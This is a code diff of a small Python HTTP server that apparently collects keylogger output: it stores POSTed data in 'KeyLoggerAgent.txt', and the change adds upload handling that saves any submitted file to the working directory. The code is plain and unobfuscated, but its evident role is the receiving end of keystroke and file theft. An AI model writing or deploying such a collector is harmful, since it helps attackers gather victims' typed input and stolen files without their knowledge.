@@ -1,37 +1,47 @@
 import http.server
 import socketserver
 import json
+import cgi
+import os
 
 PORT = 8000
 DATA_FILENAME = "KeyLoggerAgent.txt"
+UPLOAD_DIR = "./"
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
-        content_length = int(self.headers['Content-Length'])
-        post_data = self.rfile.read(content_length).decode('utf-8')
+        ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
+        if ctype == 'multipart/form-data':
+            form = cgi.FieldStorage(
+                fp=self.rfile,
+                headers=self.headers,
+                environ={'REQUEST_METHOD': 'POST'}
+            )
 
-        try:
-            data_to_save = post_data
-            try:
-                json_data = json.loads(post_data)
-                data_to_save = json.dumps(json_data, indent=4)
-            except json.JSONDecodeError:
-                pass
+            if "file" in form:
+                file_item = form["file"]
 
-            with open(DATA_FILENAME, "a") as f:
-                f.write(data_to_save + "\n---\n")
-            print(f"Data successfully saved to {DATA_FILENAME}")
+                if file_item.filename:
+                    os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-            self.send_response(200)
-            self.send_header("Content-type", "text/plain")
-            self.end_headers()
-            self.wfile.write(b"Data received and saved successfully!")
+                    file_path = os.path.join(UPLOAD_DIR, os.path.basename(file_item.filename))
 
-        except Exception as e:
-            self.send_response(500)
-            self.send_header("Content-type", "text/plain")
-            self.end_headers()
-            self.wfile.write(f"Error: {e}".encode('utf-8'))
+                    with open(file_path, 'wb') as output_file:
+                        output_file.write(file_item.file.read())
+
+                    self.send_response(200)
+                    self.end_headers()
+                    self.wfile.write(f"File '{file_item.filename}' uploaded successfully!".encode('utf-8'))
+                    return
+                else:
+                    self.send_response(400)
+                    self.end_headers()
+                    self.wfile.write(b"No file uploaded.")
+                    return
+
+        self.send_response(400)
+        self.end_headers()
+        self.wfile.write(b"Invalid request. Expected multipart/form-data.")
 
     def do_GET(self):
         if self.path == '/':
@@ -45,7 +55,6 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
 with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
     print(f"Serving at port {PORT}")
     print(f"Data will be saved to '{DATA_FILENAME}' in the current directory.")
-    print("Press Ctrl+C to stop the server.")
     try:
         httpd.serve_forever()
     except KeyboardInterrupt:print("\nServer stopped.")
